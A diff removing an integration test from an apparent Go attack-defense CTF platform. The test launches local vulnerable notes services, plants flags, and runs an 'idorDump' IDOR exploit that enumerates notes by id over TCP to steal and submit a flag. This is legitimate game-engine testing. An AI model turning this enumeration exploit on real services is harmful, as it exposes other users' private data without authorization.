@@ -3,12 +3,9 @@
 package game
 
 import (
-	"bufio"
 	"context"
 	"fmt"
-	"net"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -600,136 +597,5 @@ func TestIntegrationTeamForUser(t *testing.T) {
 	}
 	if _, ok, err := TeamForUser(ctx, db, user); err != nil || ok {
 		t.Errorf("disabled team resolved for submission: ok=%v err=%v", ok, err)
-	}
-}
-
-func seedTeamIP(t *testing.T, db *database.DB, name, ip string) uuid.UUID {
-	t.Helper()
-	id := uuid.New()
-	_, err := db.Pool.Exec(context.Background(),
-		`INSERT INTO game_teams (id, name, slug, token, status, is_nop, vulnbox_ip)
-		 VALUES ($1, $2, $2, $2, 'active', false, $3)`, id, name, ip)
-	if err != nil {
-		t.Fatalf("seed team %s: %v", name, err)
-	}
-	return id
-}
-
-func seedServiceOnPort(t *testing.T, db *database.DB, checker string, port int) {
-	t.Helper()
-	_, err := db.Pool.Exec(context.Background(),
-		`INSERT INTO game_services (id, name, slug, category, tier, port, checker_ref, flag_stores, enabled)
-		 VALUES ($1, 'Notes', 'notes', 'misc', 'core', $2, $3, 1, true)`, uuid.New(), port, checker)
-	if err != nil {
-		t.Fatalf("seed service: %v", err)
-	}
-}
-
-func startNotes(t *testing.T, serverPy, host string, port int) *exec.Cmd {
-	t.Helper()
-	cmd := exec.Command("python3", serverPy)
-	cmd.Env = append(os.Environ(), "HOST="+host, fmt.Sprintf("PORT=%d", port))
-	if err := cmd.Start(); err != nil {
-		t.Fatalf("start notes on %s: %v", host, err)
-	}
-	addr := net.JoinHostPort(host, strconv.Itoa(port))
-	for i := 0; i < 50; i++ {
-		if conn, err := net.DialTimeout("tcp", addr, 300*time.Millisecond); err == nil {
-			conn.Close()
-			return cmd
-		}
-		time.Sleep(200 * time.Millisecond)
-	}
-	cmd.Process.Kill()
-	t.Fatalf("notes on %s never came up", addr)
-	return nil
-}
-
-// idorDump exploits FETCH-by-id (no auth, no ownership check) to read every note.
-func idorDump(t *testing.T, host string, port, maxID int) []string {
-	t.Helper()
-	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 2*time.Second)
-	if err != nil {
-		t.Fatalf("dial %s: %v", host, err)
-	}
-	defer conn.Close()
-	conn.SetDeadline(time.Now().Add(5 * time.Second))
-	r := bufio.NewReader(conn)
-	r.ReadString('\n') // banner
-
-	var vals []string
-	for id := 1; id <= maxID; id++ {
-		fmt.Fprintf(conn, "FETCH %d\n", id)
-		line, err := r.ReadString('\n')
-		if err != nil {
-			break
-		}
-		if line = strings.TrimSpace(line); strings.HasPrefix(line, "OK ") {
-			vals = append(vals, strings.TrimPrefix(line, "OK "))
-		}
-	}
-	return vals
-}
-
-// TestIntegrationRealService runs the whole chain with real components: two live
-// H7-NOTES services, the real checker planting real flags each tick, then a real
-// IDOR exploit that steals a flag and submits it for points.
-func TestIntegrationRealService(t *testing.T) {
-	dir, err := filepath.Abs("../../services/example-notes")
-	if err != nil {
-		t.Fatal(err)
-	}
-	serverPy := filepath.Join(dir, "server.py")
-	checkerPy := filepath.Join(dir, "checker.py")
-	if _, err := os.Stat(serverPy); err != nil {
-		t.Skip("reference service not present")
-	}
-	if _, err := exec.LookPath("python3"); err != nil {
-		t.Skip("python3 not available")
-	}
-
-	ctx := context.Background()
-	db := testDB(t)
-	defer db.Close()
-
-	na := startNotes(t, serverPy, "127.0.0.2", 9001)
-	defer na.Process.Kill()
-	nb := startNotes(t, serverPy, "127.0.0.3", 9001)
-	defer nb.Process.Kill()
-
-	a := seedTeamIP(t, db, "alpha", "127.0.0.2")
-	b := seedTeamIP(t, db, "bravo", "127.0.0.3")
-	seedServiceOnPort(t, db, checkerPy, 9001)
-
-	ctrl := testController(db)
-	runTickOK(t, ctrl, ctx, 1)
-
-	if n := count(t, db, `SELECT COUNT(*) FROM game_sla_checks WHERE status = 'OK'`); n != 2 {
-		t.Fatalf("expected 2 OK sla checks from the real checker, got %d", n)
-	}
-
-	var target string
-	if err := db.Pool.QueryRow(ctx, `SELECT flag FROM game_flags WHERE team_id = $1`, b).Scan(&target); err != nil {
-		t.Fatalf("read bravo's planted flag: %v", err)
-	}
-
-	stolen := ""
-	for _, v := range idorDump(t, "127.0.0.3", 9001, 20) {
-		if v == target {
-			stolen = v
-		}
-	}
-	if stolen == "" {
-		t.Fatalf("IDOR exploit did not recover bravo's flag from its service")
-	}
-
-	if out, err := SubmitFlag(ctx, db, a, stolen); err != nil || out != SubmitAccepted {
-		t.Fatalf("submit stolen flag: got %s err=%v want accepted", out, err)
-	}
-	if err := ctrl.recomputeStandings(ctx); err != nil {
-		t.Fatalf("recompute standings: %v", err)
-	}
-	if s := getStanding(t, db, a); s.attack <= 0 {
-		t.Fatalf("alpha should have attack points after a real steal, got %v", s.attack)
 	}
 }
